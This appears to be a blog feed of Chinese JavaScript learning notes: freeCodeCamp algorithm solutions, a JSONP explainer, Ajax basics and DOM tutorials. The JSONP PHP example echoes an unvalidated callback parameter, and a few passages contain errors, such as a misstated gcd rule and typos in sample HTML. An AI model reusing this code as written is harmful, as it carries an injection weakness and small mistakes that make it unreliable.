Eh-oh&quot;);//返回 &quot;teletubbies-say-eh-oh&quot; spinalCase(&quot;thisIsSpinalTap&quot;);//返回 &quot;this-is-spinal-tap&quot; Sum All Odd Fibonacci Numbers题目：给一个正整数num，返回小于或等于num的斐波纳契奇数之和。 斐波纳契数列中的前几个数字是 1、1、2、3、5 和 8，随后的每一个数字都是前两个数字之和。 例如，sumFibs(4)应该返回 5，因为斐波纳契数列中所有小于4的奇数是 1、1、3。 提示：此题不能用递归来实现斐波纳契数列。因为当num较大时，内存会溢出，推荐用数组来实现。 tips:Remainder) 参考文档 实现 function sumFibs(num) { //先找到所有小于num的斐波那契数，并存在数组fibsArr中 var fibsArr = [1, 1, 2]; for(i = 2; i &lt; num; i++) { if (fibsArr[i] + fibsArr[i-1] &lt;= num) { fibsArr.push(fibsArr[i] + fibsArr[i-1]); } } //筛选出fibsArr中的奇数并求和 var sum = fibsArr.filter(function(element, index) { //若为奇数则返回 return element % 2 !== 0; }).reduce(function(prev, curr) { return prev += curr; }); return sum; } sumFibs(1);//返回2 Sum All Primes题目：求小于等于给定数值的质数之和。 给定的数不一定是质数。 只有 1 和它本身两个约数的数叫质数。例如，2 是质数，因为它只能被 1 和 2 整除。1 不是质数，因为它只能被自身整除。 tips:For Loops Array.push() 实现 //判断一个数是不是素数 function isPrime(num) { //判断输入是否为number类型，是否为整数 if(typeof(num) !== &apos;number&apos; || !Number.isInteger(num)) { return false; } //num小于2时，不是素数 if(num &lt; 2) {return false;} //num等于2时，是素数 if(num === 2) {return true;} //num大于2时，如果num可以被2整除（即num为偶数），不是素数 else if(num % 2 === 0) {return false;} //num大于2时，依次判断num能否被奇数整除，最大循环为num的开方 var range = Math.ceil(Math.sqrt(num)); for(var i = 3; i &lt;= range; i+=2) { if(num % i === 0) {return false;} } return true; } //求小于等于给定数值的质数之和 function sumPrimes(num) { var sum = 0; for(var i = 0; i &lt;= num; i ++) { //对于小于num的每个数先判断是否为素数，若为素数则叠加 if(isPrime(i)) { sum += i; } } return sum; } sumPrimes(977);//返回73156 Smallest Common Multiple题目：找出能被两个给定参数和它们之间的连续数字整除的最小公倍数。 范围是两个数字构成的数组，两个数字不一定按数字顺序排序。 例如对 1 和 3 —— 找出能被 1 和 3 和它们之间所有数字整除的最小公倍数。 tips:Smallest Common Multiple 辗转相除法 思路：最小公倍数 = 两个数的积 / 最大公约数 最大公约数用辗转相除法（欧几里得算法）求得，即当 a mod b=0时，gcd(a,b)=0,否则gcd(a,b)=gcd(b,a mod b)。 求连续几个数的最小公倍数，可以先求得边界两个数的最小公倍数，再用此最小公倍数依次和中间的数值求最小公倍数，从而得到所有数的最小公倍数。 实现 function smallestCommons(arr) { //首先对两个给定参数排序,按从小到大排序 arr.sort(function(a, b) { return a - b; }); //求a和b的最小公倍数 var a = arr[0]; var b = arr[1]; //flag表示边界两个数的最小公倍数 var flag = smallestCommonMultiple(a, b); //用flag依次和中间的数值求最小公倍数，即得最终的最小公倍数 for(var i = a +1; i &lt; b; i ++) { flag = smallestCommonMultiple(flag, i); } return flag; } //欧几里得算法求两个数的最大公约数,a&lt;=b function gcd (a, b) { //当除数为零时，最大公约数为被除数a if(!b) {return a;} //否则辗转相除 return gcd(b, a%b); } //求两个数的最小公倍数 function smallestCommonMultiple(a, b) { return a * b / gcd(a, b); } smallestCommons([1,5]);//返回60 Finders Keepers题目：写一个 function，它遍历数组 arr，并返回数组中第一个满足 func 返回值的元素。举个例子，如果 arr 为 [1, 2, 3]，func 为 function(num) {return num === 2; }，那么 find 的返回值应为 2。 tips:Array.filter() 实现 function find(arr, func) { var num = 0; //注意filter()方法创建一个新数组, 其包含通过所提供函数实现的测试的所有元素。 //而我们只需要返回第一个满足func的元素 num = arr.filter(func).length === 0 ? undefined : arr.filter(func)[0]; return num; } find([1, 2, 3, 4], function(num){ return num % 2 === 0; });//返回2 Drop it题目：丢弃数组(arr)的元素，从左边开始，直到回调函数return true就停止。 第二个参数，func，是一个函数。用来测试数组的第一个元素，如果返回fasle，就从数组中抛出该元素(注意：此时数组已被改变)，继续测试数组的第一个元素，如果返回fasle，继续抛出，直到返回true。 最后返回数组的剩余部分，如果没有剩余，就返回一个空数组。 tips:Arguments object Array.shift() Array.slice() 实现 function drop(arr, func) { //只要func返回false就左移抛出该元素，继续判断左移后的第一个元素是否满足条件 while(!func(arr[0])) { //shift() 方法从数组中删除第一个元素，并返回该元素的值。shift()方法会改变原数组 arr.shift(); } return arr; } drop([1, 2, 3], function(n) {return n &lt; 3; }); Steamroller题目：对嵌套的数组进行扁平化处理。你必须考虑到不同层级的嵌套。 tips:Array.isArray() 实现 function steamroller(arr) { //扁平化处理后的数组 var afterArr = []; for(var i = 0; i &lt; arr.length; i ++) { //依次判断数组中元素类型是否为数组 //如果元素是数组类型，继续对该元素做数组扁平化处理 if(Array.isArray(arr[i])) { var midArr = steamroller(arr[i]); afterArr = afterArr.concat(midArr); //如果不是数组类型，则将该元素push进afterArr储存 }else { afterArr.push(arr[i]); } } return afterArr; } steamroller([1, [2], [3, [[4]]]]);//返回[1,2,3,4] Binary Agents题目：传入二进制字符串，翻译成英语句子并返回。二进制字符串是以空格分隔的。 tips:String.charCodeAt() String.fromCharCode() 实现 function binaryAgent(str) { var strToArr = []; var afterTrans = &quot;&quot;; //将二进制字符串按空格划分为字符串数组，并转化为number类型，十进制形式 str.split(&quot; &quot;).forEach(function(item,index) { //将二进制形式转化为十进制形式 strToArr.push(parseInt(item, 2)); }); afterTrans = strToArr.reduce(function(prev, curr) { //将数组中的十进制Unicode码通过String.fromCharCode()方法转换为字母，利用reduce()方法依次处理数组元素并拼接成字符串 return prev + String.fromCharCode(curr); },&quot;&quot;); return afterTrans; } binaryAgent(&quot;01001001 00100000 01101100 01101111 01110110 01100101 00100000 01000110 01110010 01100101 01100101 01000011 01101111 01100100 01100101 01000011 01100001 01101101 01110000 00100001&quot;);//返回&quot;I love FreeCodeCamp!&quot; Everything Be True题目：完善编辑器中的every函数，如果集合(collection)中的所有对象都存在对应的属性(pre)，并且属性(pre)对应的值为真。函数返回ture。反之，返回false。 记住：你只能通过中括号来访问对象的变量属性(pre)。 tips:可以有多种实现方式，最简洁的方式莫过于Array.prototype.every() every 方法为数组中的每个元素执行一次 callback 函数，直到它找到一个使 callback 返回 false（表示可转换为布尔值 false 的值）的元素。如果发现了一个这样的元素，every 方法将会立即返回 false。否则，callback 为每一个元素返回 true，every 就会返回 true。 callback 被调用时传入三个参数：元素值，元素的索引，原数组。 实现 function every(collection, pre) { //使用every() 方法测试数组的所有元素是否都通过了指定函数的测试。 var flag = collection.every(function(item, index) { //如果对象不存在pre属性，则返回false if(!item.hasOwnProperty(pre)) {return false;} //测试pre属性的值是否为true if(!item[pre]) {return false;} return true; }); return flag; } every([{&quot;user&quot;: &quot;Tinky-Winky&quot;, &quot;sex&quot;: &quot;male&quot;}, {&quot;user&quot;: &quot;Dipsy&quot;, &quot;sex&quot;: &quot;male&quot;}, {&quot;user&quot;: &quot;Laa-Laa&quot;, &quot;sex&quot;: &quot;female&quot;}, {&quot;user&quot;: &quot;Po&quot;, &quot;sex&quot;: &quot;female&quot;}], &quot;sex&quot;);//返回true 换一种简洁的写法： function every(collection, pre) { return collection.every(function(elements){ return elements.hasOwnProperty(pre) &amp;&amp; Boolean(elements[pre]); }); } Arguments Optional题目：创建一个计算两个参数之和的 function。如果只有一个参数，则返回一个 function，该 function 请求一个参数然后返回求和的结果。 例如，add(2, 3) 应该返回 5，而 add(2) 应该返回一个 function。调用这个有一个参数的返回的 function，返回求和的结果：var sumTwoAnd = add(2);sumTwoAnd(3) 返回 5。如果两个参数都不是有效的数字，则返回 undefined。 tips:Closures Arguments object 实现 function add() { //如果add有两个参数，则返回两个参数的和 if(arguments.length === 2 &amp;&amp; typeof arguments[0] === &quot;number&quot; &amp;&amp; typeof arguments[1] === &quot;number&quot;) { return arguments[0] + arguments[1]; } //如果add有一个参数，则通过闭包方式返回一个函数 if(arguments.length === 1 &amp;&amp; typeof arguments[0] === &quot;number&quot;) { var x = arguments[0]; //通过闭包方式返回只有一个参数的函数 return function(y) { if(typeof y === &quot;number&quot;) { return x + y;} return undefined; }; } return undefined; } add(2,3);//返回5 add(2)(3);//返回5 add(2)([3]);//返回undefined add(2, &quot;3&quot;);//返回undefined add(&quot;http://bit.ly/IqT6zt&quot;);//返回undefined]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSONP简要了解]]></title>
    <url>%2F2017%2F11%2F15%2FJSONP%E7%AE%80%E8%A6%81%E4%BA%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[在freeCodeCamp上学习使用twith TV API获取频道信息时，在freeCodeCamp的指导中提到若使用$.getJSON(()方法会因为跨域资源共享(CORS)问题发生错误信息。 freeCodeCamp Challenge Guide: How to Use the TwitchTV API 中建议使用jQuery的JSONP方法来解决CORS问题。 JSONP的诞生传统ajax无法跨域，而标签的src属性是可以跨域的,可以通过把跨域服务器写成调用本地的函数 ，回调数据回来。 json刚好被js支持（object） 调用跨域服务器上动态生成的js格式文件（不管是什么类型的地址，最终生成的返回值都是一段js代码） 这种获取远程数据的方式看起来非常像ajax，但其实并不一样，便于客户端使用数据，逐渐形成了一种非正式传输协议，人们把它称作JSONP。 传递一个callback参数给跨域服务端，然后跨域服务端返回数据时会将这个callback参数作为函数名来包裹住json数据即可。 例子（1）跨域服务器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文件：remote.js alert(&quot;我是远程文件&quot;); 本地 &lt;script type=&quot;text/javascript&quot; src=&quot;跨域服务器/remote.js&quot;&gt;&lt;/script&gt; 在本地标签直接引入一个js文件，页面将会弹出警告框。 （2）跨域服务器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文件：remote.js localHandler({&quot;result&quot;:&quot;我是远程js带来的数据&quot;}); 本地 &lt;script type=&quot;text/javascript&quot;&gt; var localHandler = function(data){ alert(&apos;我是本地函数，可以被跨域的remote.js文件调用，远程js带来的数据是：&apos; + data.result); }; &lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;跨域服务器/remote.js&quot;&gt;&lt;/script&gt; 该例子中在本地定义了一个函数localHandler，在本地通过标签的src属性引入了跨域服务器上的一个js文件remote.js，在引入的js文件里调用了本地定义的函数localHandler。 问题：如何让远程js文件知道它应该调用的本地函数的名字呢？毕竟jsonp的服务者都要面对很多服务对象，而这些服务对象各自的本地函数都不相同。 （3）跨域服务器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文件：flightResult.php flightHandler({ &quot;code&quot;:&quot;CA1998&quot;, &quot;price&quot;: 1780, &quot;tickets&quot;: 5 }); 本地 &lt;script type=&quot;text/javascript&quot;&gt; // 得到航班信息查询结果后的回调函数 var flightHandler = function(data){ alert(&apos;你查询的航班结果是：票价 &apos; + data.price + &apos; 元，&apos; + &apos;余票 &apos; + data.tickets + &apos; 张。&apos;); }; // 提供jsonp服务的url地址（不管是什么类型的地址，最终生成的返回值都是一段javascript代码） var url = &quot;跨域服务器/flightResult.php?code=CA1998&amp;callback=flightHandler&quot;; // 创建script标签，设置其属性 var script = document.createElement(&apos;script&apos;); script.setAttribute(&apos;src&apos;, url); // 把script标签加入head，此时调用开始 document.getElementsByTagName(&apos;head&apos;)[0].appendChild(script); &lt;/script&gt; 在该例中动态创建标签（动态创建脚本）； url中传递了一个code参数，服务器去做查询CA1998次航班的信息，callback参数告诉服务器，我的本地回调函数叫做flightHandler； 跨域服务端调用这个函数flightHandler，页面将会弹出一个提示窗体，显示出票价和余票。 JSONP方法中服务器做的事情// 数据 $data = [ &quot;name&quot;:&quot;anonymous66&quot;, &quot;age&quot;:&quot;18&quot;, &quot;like&quot;:&quot;jianshu&quot; ]; // 接收callback函数名称 $callback = $_GET[&apos;callback&apos;]; // 输出 echo $callback . &quot;(&quot; . json_encode($data) . &quot;)&quot;; 服务器端做的就是获取url中的callback参数，并将callback参数作为函数名来包裹json数据，动态生成js文件，再返回给客户端。 JSONP与AJAX的区别ajax的核心是通过XMLHttpRequest获取非本页内容。 jsonp的核心则是动态添加标签来调用服务器提供的js脚本。 JSONP优缺点优点：它不像XMLHttpRequest对象实现的Ajax请求那样受到同源策略的限制；它的兼容性更好，在更加古老的浏览器中都 可以运行，不需要XMLHttpRequest或ActiveX的支持；并且在请求完毕后可以通过调用callback的方式回传结果。 缺点：它只支持GET请求而不支持POST等其它类型的HTTP请求；它只支持跨域HTTP请求这种情况，不能解决不同域的两个页面之间如何进行JavaScript调用的问题。JSONP是一种脚本注入(Script Injection)行为，所以有一定的安全隐患。 转自：segmentfault专栏JSONP是什么 参考：JSONP原理优缺点(只能GET不支持POST)]]></content>
      <categories>
        <category>JSONP</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>JSONP</tag>
        <tag>JSON</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ajax基础用法---from imooc]]></title>
    <url>%2F2017%2F11%2F06%2Fajax-imooc%2F</url>
    <content type="text"><![CDATA[ajax,即异步JavaScript和XML，通过在后台和服务器少量的数据交换实现页面的异步局部加载更新。ajax中一个关键的对象 XMLHttpRequest对象，作为网页和服务器之间交换数据的桥梁，来实现网页的异步请求、局部刷新。 创建XMLHttpRequest对象在现代浏览器中创建XMLHttpRequest对象 var request = new XMLHttpRequest();//现代浏览器 若在早期老版本浏览器中，考虑兼容性，创建XMLHttpRequest对象方式如下： var request; if(window.XMLHttpRequest) { request = new XMLHttpRequest(); } else { request = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);//IE6,IE5 } HTTP协议HTTP是一种无状态协议。一个HTTP请求包括以下7个步骤： 建立TCP连接 WEB浏览器向WEB服务器发送请求命令 WEB浏览器发送请求头信息 WEB服务器应答 WEB服务器发送应答头信息 WEB服务器向浏览器发送数据 WEB服务器关闭TCP连接 HTTP请求一个HTTP请求一般由四部分组成： HTTP请求的方法和动作，比如GET或POST请求 正在请求的URL 请求头，包含一些客户端环境信息、身份验证信息等 请求体，即请求正文，包含客户提交的查询字符串信息、表单信息等一般来说请求头和请求正文之间有一个空行，表示请求头结束。一篇关于GET、POST请求的博文详解GET:一般用于信息获取，使用URL传递参数，对所发送信息的数量也有限制，一般在2000个字符。(用于查询，一般不用于新建和修改。默认为GET提交)POST:一般用于修改服务器上的资源，对所发送信息的数量无限制。HTTP响应一个HTTP响应一般由三部分组成： 一个数字和文字组成的状态码，表示请求成功还是失败 响应头，包含服务器类型、日期时间、内容类型、长度等 响应体，即响应正文HTTP状态码的类型： XMLHttpRequest发送请求两个方法，open和send open(method, url, async) send(string)open方法用于设置请求，第一个参数method表示请求的类型，即GET或POST；第二个参数url即请求的地址，绝对地址或相对地址；第三个参数表示是否异步请求，默认为true。send方法用于发送请求，当使用get请求时，send可不给出参数，而使用post请求时必须有参数。例如： request.open(“POST”,”create.php”,true); request.setRequestHeader(“Content-type”,”application/x-www-form-urlencoded “)//设置HTTP头信息，一定要写在open()和send()之间 request.send(“name=xxxx&amp;sex=xxx”); XMLHttpRequest取得响应通过监听XMLHttpRequest对象readyState属性的变化，判断服务器的状态变化信息。通过.onreadystatechange()方法监听readyState属性的变化，当readyState为4（响应完成）并且status为200(请求成功)时，再对响应数据做处理： var request = new XMLHttpRequest(); request.open(&quot;POST&quot;,&quot;get.php&quot;,true); request.send(); request.onreadystatechange = function() { if(request.readyState == 4 &amp;&amp; request.status == 200) { //做一些处理，例如request.responseText } } PHP]]></content>
      <categories>
        <category>Ajax</category>
      </categories>
      <tags>
        <tag>Ajax</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[planeGame-H5 Canvas小游戏未完成的问题]]></title>
    <url>%2F2017%2F10%2F30%2FplaneGameQuestion%2F</url>
    <content type="text"><![CDATA[H5 Canvas打飞机游戏中未完成以及存在疑惑的地方。 未完成内容游戏设置部分音乐设置（HTML5 audio相关的学习，包括设置游戏背景音乐以及各种子弹、爆炸等声音，以及切换声音的开启和关闭） 背景设置（即切换背景图片） 战机设置（即切换战机plane的icon图片） 存在问题的地方点击“再玩一次”之后，敌机以及子弹的速度会越来越快，差不多第三次重玩就无法进行了。感觉是因为上一次游戏过程中的一些数据没有清除，怀疑过是不是setInterval()的原因，百度了查了好多，在end处添加了window.clearInterval()，但也是无济于事。特将此问题记录，以待后面将js学深了再来解决。 可以改进的地方游戏结束以后，除了“再玩一次”，再添加一个“退出游戏”功能，使页面切换到index状态。 适应手机端的，试了下在电脑上战机移动不了，应该是手指移动事件那里还未考虑鼠标移动来兼容电脑浏览器。 效果截图主页面如下： 游戏结束，“再玩一次”界面 github源码github仓库地址：demo-planegame 放在gh-pages上的样子，电脑端战机移动不了。demo展示]]></content>
      <categories>
        <category>Canvas</category>
      </categories>
      <tags>
        <tag>HTML5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS笔记(二)DOM操作--from next十天训练营]]></title>
    <url>%2F2017%2F10%2F20%2Fnext-js2%2F</url>
    <content type="text"><![CDATA[JS调用DOM接口修改样式。 DOM简介 上图是一张网页的生成过程，大致分为五步： （1）html代码转化为DOM树 （2）CSS代码转化成CSSOM（CSS Object Model） （3）结合DOM和CSSOM，生成一棵渲染树（包含每个节点的视觉信息） （4）生成布局（layout），即将所有渲染树的所有节点进行平面合成 （5）将布局绘制（paint）在屏幕上 “生成布局”（flow）和”绘制”（paint）这两步，合称为”渲染”（render）。 其中，在html文档生成DOM树后，JS可以通过DOM提供的接口来添加、删除、修改元素和样式。 DOM查找查找API: document.getElementById()//通过元素id查找，查找一个元素 [document|Element].getElementsByClassName()//通过元素类名查找，查找一组元素，得到一个类数组(html collection) [document|Element].getElementsByTagName()//通过元素标签名查找,查找一组元素，得到一个类数组 [document|Element].querySelector()//通过CSS选择器查找，例如 var qId = document.querySelector(&apos;#id&apos;); [document|Element].querySelectorAll()//通过CSS选择器查找 后两者常用。 DOM新增和删除（1）新增节点新增一个元素时，包括插入和追加。前面插入用insertBefore()，后面追加用appendChild()。 parent.appendChild(element)//新增节点到父元素的末尾 parentElement.insertBefore(newElement, targetElement)//新增节点到targetElement元素的前面 注意：使用.insertBefore()方法时，不必搞清楚父元素到底是哪个，因为targetElement元素的parentNode属性值就是它。所以可以通过targetElement.parentNode.insertBefore(newElement, targetElement)来插入。 新增多个元素时，可以利用上述两个方法结合循环实现，但循环会导致一个问题，因为直接操作DOM会导致浏览器反复渲染。利用DocumentFragment节点解决这个反复渲染问题。 DocumentFragment文档片段，可以理解为“轻量级”的节点。有两个属性，分别为：nodeType = 11, nodeName = #document-fragment。DocumentFragment作为仓库来使用，不在DOM树中，游离在DOM树之外。当增加多个节点时，可将这多个节点临时存放在DocumentFragment仓库中，最后再一次性插入DOM树中，就解决了浏览器反复渲染的问题。 （2）删除节点删除节点使用removeChild() （3）创建节点 此时创建出的节点即为DocumentFragment文档碎片，创建完以后再插入或者追加到DOM树中。 document.createElement(nodeName)//创建元素节点,nodeName即为h1,h2,li,p,.... document.creatTextNode(text)//创建文本节点 练习题 题目要求:现有 HTML 代码如下, &lt;body&gt; &lt;h1&gt;按要求新增元素&lt;/h1&gt; &lt;/body&gt; 在h1元素的后面新增一个ul元素，ul元素中有一百个li元素，li的内容就是 1-100 ，如下所示： &lt;body&gt; &lt;h1&gt;按要求新增元素&lt;/h1&gt; &lt;ul&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; ...... &lt;li&gt;98&lt;/li&gt; &lt;li&gt;99&lt;/li&gt; &lt;li&gt;100&lt;/li&gt; &lt;/ul&gt; &lt;/body&gt; js代码如下： var len = 100; var ul = document.createElement(&apos;ul&apos;); var body = document.getElementsByTagName(&apos;body&apos;)[0]; for(var i = 0; i &lt; len; i++){ var li = document.createElement(&apos;li&apos;); var liText = document.createTextNode(i+1); li.appendChild(liText); ul.appendChild(li); } body.appendChild(ul); DOM修改样式两种方式修改元素样式：通过元素style属性修改；通过元素class属性修改。 （1）style属性 style属性包含着元素诸如颜色大小等样式，style属性是一个对象。如访问style对象的color属性：element.style.color。 注意：当引用一个中间带减号的CSS属性时，DOM要求用驼峰命名法。CSS属性font-family变为了DOM属性fontFamily：element.style.fontFamily。这是因为减号和加号之类的操作符是保留字，不允许用在函数或变量的名字里，意味着也不能用在方法和属性的名字里。 缺点：style属性只能返回内嵌样式。即只有把CSS style属性插入到标记里，才可以用DOM style属性去获取那些属性信息。DOM style属性不能用来检索外部CSS文件里声明的样式。 （2）class属性 利用DOM修改元素的class属性（比如新增一个class或者删除一个class），使得利用外部CSS文件中的设置的样式改变元素的样式，而不是用DOM直接操作style属性修改样式。 例如要给要给elem元素设置class属性为intro，方法如下： a.利用setAttribute()方法, elem.setAttribute(&quot;class&quot;,&quot;intro&quot;) b.通过更新className属性。className属性是一个可读可写的属性，凡是元素节点都有这个属性。可以用className属性获取一个元素的class属性，element.className。 用className属性和赋值操作符设置一个元素的class属性：element.className = value 该方法的不足，通过className属性设置某个元素的class属性时将替换该元素原有的属性（而不是追加）。 在需要给一个元素追加新的class时，可以按照以下思路： 检查className属性的是否为null； 如果是，把新的class设置值直接赋值给className属性； 若不是，把一个空格和新的class设置值追加到className属性上去。 把上述步骤封装为一个函数addClass,该函数有两个参数，第一个为需要添加的新class的元素，第二个是新的class设置值。 function addClass(element, value){ if(!element.className){ element.className = value; }else{ newClassName = element.className; newClassName+= &quot; &quot;; newClassName+=value; element.className = newClassName; } } 事件模型&lt;!DOCTTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;/&gt; &lt;title&gt;事件简介&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;section&gt; &lt;button id=&quot;button&quot;&gt;点击切换背景颜色&lt;/button&gt; &lt;/section&gt; &lt;/body&gt; &lt;/html&gt; 针对上述代码，当点击了button后事件反应机制有两种(这两种是上古时代的做法 。 。) 第一种是点击button后，button将事件传递到section，再传递到body，再传递到html，再传递到document。该种方式即为事件冒泡机制。如下图所示： 第二种是点击button后，从document开始一层层捕获，即为事件捕获机制。如下图所示。 目前标准的DOM事件流做法分为三个阶段：事件捕获阶段、处于目标阶段、事件冒泡阶段。 事件捕获阶段的结束阶段为目标元素的父元素，然后是处于目标阶段，接下来是事件冒泡阶段。在实际开发过程中，由于浏览器兼容问题，事件捕获过程基本不用，会频繁使用目标和事件冒泡。流程如下所示。 事件处理程序添加事件处理程序： element.addEventListener(type, handle, false)//type表示事件类型，handle为事件处理函数，false表示采用冒泡机制 删除事件处理程序： element.removeEventListener(type, handle) 例如： h1.addEventListener(&apos;click&apos;, function(){ console.log(this);//this指向绑定事件处理函数的对象，即h1元素 }, false); 事件对象 事件对象包含着所有与事件相关的信息。 var h1 = document.querySelector(&apos;h1&apos;); var handle = function(event) { //event即为事件处理对象，包括了触发点击事件时鼠标的位置等等信息 console.log(&apos;event&apos;, event); //将event对象打印出来并查看event对象包含哪些信息 } h1.addEventListener(&apos;click&apos;, handle, false); 事件冒泡 var h1 = document.querySelector(&apos;h1&apos;); var handle = function(event) { console.log(&apos;event&apos;, event); } document.body.addEventListener(&apos;click&apos;, handle, false);//将点击事件函数绑定在body上 虽然点击事件绑定在body上，但此时点击h1元素，仍会触发事件打印event对象。此为事件冒泡。 流程：当点击目标元素h1，先找h1上有没有点击事件，有则触发，没有则按照冒泡机制一层层往上找，看有没有点击事件，直到冒泡到document。 阻止事件冒泡： var h1 = document.querySelector(&apos;h1&apos;); var handle = function(event) { console.log(&apos;event&apos;, event); } document.body.addEventListener(&apos;click&apos;, handle, false);//将点击事件函数绑定在body上 h1.addEventListener(&apos;click&apos; function(event) { event.stopPropagation();//阻止事件冒泡，当点击h1元素时，不会触发点击事件 }, false);]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS笔记(一)--from next十天训练营]]></title>
    <url>%2F2017%2F10%2F20%2Fnext-js%2F</url>
    <content type="text"><![CDATA[NEXT十天训练营有关JS学习的笔记。 认识JavaScriptJS是目前主流浏览器唯一支持的脚本语言，由以下三部分组成： （1）ECMAScript:语言基础（核心）。 ECMA-262标准规定了ECMAScript这门语言的组成部分，例如语法、类型、语句、关键字、保留字、操作符、对象。 Web浏览器只是ECMAScript实现可能的宿主环境之一，其他宿主环境还包括Node(一种服务端JavaScript平台)和Adobe Flash。 （2）DOM（Document Object Model,文档对象模型） 通过DOM可以操作HTML元素，包括删除、添加、替换、修改节点等。DOM将整个HTML文档映射为一个多层节点结构，即DOM树。 （3）BOM（Browser Object Model,浏览器对象模型） 通过BOM获取一些浏览器的信息，以及控制浏览器的一些行为。 引入JavaScript有三种方式可以在HTML文档里引入JavaScript。 （1）行内方式。即直接在HTML元素的属性上应用js代码。 例如以下代码中button元素的onclick属性，点击button就会弹出消息框并显示“hello”。 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;/&gt; &lt;title&gt;JavaScript引入&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;button id=&quot;helloBtn&quot; onclick=&quot;alert(&apos;hello&apos;);&quot;&gt;点击弹出消息框&lt;/button&gt; &lt;/body&gt; &lt;/html&gt; 但这种方式不建议使用。一是因为这种方式针对一些用户的事件触发js执行，局限性较大。二是html文档中掺杂js代码会显得文档很乱，背离了结构应与样式、行为相分离的原则。 （2）内嵌方式。即通过一对标签在html文档中插入js代码。 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;/&gt; &lt;title&gt;JavaScript引入&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;button id=&quot;helloBtn&quot; &gt;点击弹出消息框&lt;/button&gt; &lt;sript&gt; var helloBtn = documnet.getElementById(&quot;helloBtn&quot;); helloBtn.onclick = function() { alert(&quot;hello&quot;); } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 此种方式也有缺点。例如在不同页面使用上述标签之间这段js代码时，即在不同页面使用同一段js代码会有冗余。根据场景判断是否使用该方式。 （3）外链方式。即将js代码从html文档中提取出来单独形成一个.js文件，并在html文档中引入这个.js文件。 例如将方法（2）中标签之间这段js代码提取出来，保存在一个hello.js文件中，并在html文件中引入。 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;/&gt; &lt;title&gt;JavaScript引入&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;button id=&quot;helloBtn&quot;&gt;点击弹出消息框&lt;/button&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;hello.js&quot;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 根据场景判断是否使用该方式。 变量（1）语法: var 变量名 变量名区分大小写，首字母必须是字母、下划线或者$，非关键字和保留字。例如，var name = &quot;bottle&quot;; （2）全局变量和局部变量： 使用var定义的变量可能是全局变量也可能是局部变量，取决于是否在一个function中。如在function中使用var定义一个变量message，此变量即为一个局部变量。局部变量在function外面访问不到。若在function内不使用var定义变量message，则在函数外可以访问到该变量。 使用var定义 function test() { var message = &quot;hi&quot;;//定义一个局部变量 } test(); alert(message);//错误，找不到变量message 不使用var定义 function test() { message = &quot;hi&quot;;//定义一个全局变量 } test(); alert(message);//hi 使用控制台console来调试js代码。alert()弹出一个提示框。console.log()打印。 利用sources里面的snippets来观察变量。如下所示。 局部变量测试结果如下所示。 全局变量测试结果如下所示。 数据类型1、基本数据类型 （1）字符串类型String （2）数字类型Number （3）布尔类型Boolean ,取值true或false （4）Null （5）Undefined 2、复杂数据类型/引用数据类型 Object 怎样判断数据类型 在浏览器控制台可使用type of 操作符来判断以下数据类型。 typeof 1//&quot;number&quot; typeof &apos;a&apos;//&quot;string&quot; typeof true//&quot;boolean&quot; typeof undefined//&quot;undefined&quot; typeof null//&quot;object&quot; (这个比较特殊) typeof {}//&quot;object&quot; typeof function(){};//&quot;function&quot; 判断数据类型的几个例子如下。 Object对象1、创建对象 （1）使用对象字面量{}创建杯子对象。（推荐，简洁明了） var bottle = { name: &quot;bottle&quot;, //key: value price: 49, isKeepWarm: true } 对象的每一个属性都可以用对应的键值对(key: value)来描述，其中key为任一合法字符，value为任意数据类型。如果属性名包含多个中间含空格的字符，要用引号包含起来。 （2）使用Object构造函数创建杯子对象。 var bottle = new Object(); bottle.name = &quot;bottle&quot;; bottle.price = 49; bottle.isKeepWarm = true; 2、对象属性读操作 （1）使用点操作符 console.log(bottle.name);//&quot;bottle&quot;（推荐） （2）使用中括号操作符 console.log(bottle[&quot;name&quot;]);//&quot;bottle&quot;（如果对象属性名即key包含空格时，必须使用中括号操作符） 函数1、函数的定义 （1）函数声明 function 函数名（参数1，参数2，...）{ 函数体 return ; } 函数声明的特点，在相同作用域下，不管在何处声明都可以调用的到。即使声明在调用之后。 （2）函数表达式 var 变量 = function(参数1，参数2，...){ 函数体 return ; } 函数表达式的调用必须在函数表达式声明之后。这是区别于函数声明的地方。 作用域 如上图所示，bottles是在函数之外声明的，是全局作用域的一个变量，所以在函数内部可以访问到bottles。而函数内部（函数作用域）声明的num为局部变量，只可以在函数内部被访问到，在函数外部无法获取。 流程控制（1）if语句 if(条件) { 执行语句1; } else{ 执行语句2; } （2）switch语句 swith(n){ case 0: 执行语句1； case 1: 执行语句2; ... } 字符串的有关操作分割字符串 splitsplit()方法可以把字符串分割为字符串数组。 &quot;2:3:4:5&quot;.split(&quot;:&quot;) // 将返回 [&quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;] 